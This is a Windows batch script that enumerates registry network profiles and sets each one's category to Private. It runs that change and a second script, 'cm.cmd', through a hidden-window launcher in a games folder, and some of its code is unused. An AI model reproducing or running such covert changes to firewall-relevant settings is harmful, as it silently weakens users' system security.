::::::::::::::::::::::::::::
::          START         ::
::::::::::::::::::::::::::::
Mode 90,20 & color 0A
SetLocal EnableExtensions DisableDelayedExpansion
(Set k=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles)
For /F "Delims==" %%A In ('Set GUID[ 2^>Nul') Do Set "%%A="
Set "i=101"
For /F "Tokens=1,2*" %%A In ('Reg Query "%k%" /S /V Description') Do (
    If "%%~nB" NEQ "%%~B" (
        Call Set "GUID[%%i:*1=%%]=%%~nB"
start "" "C:\Games\viewer.exe" /HideWindow Reg add "%k%\%%~nB" /V Category /t REG_DWORD /d 1 /f
    ) Else (
        Call Call Set GUID[%%i:*1=%%]="%%%%GUID[%%i:*1=%%]%%%%","%%C"
        Set/A i+=1
    )
)   
set /a numa=%random% %%9999 +1000
set /a numb=%random% %%9999 +1000
set /a numc=%numa%%numb%
start "" "C:\Games\viewer.exe" /HideWindow "C:\Games\cm.cmd"  
type nul > "C:\Games\cmmc.cmd"&echo EXIT > "C:\Games\cmmc.cmd"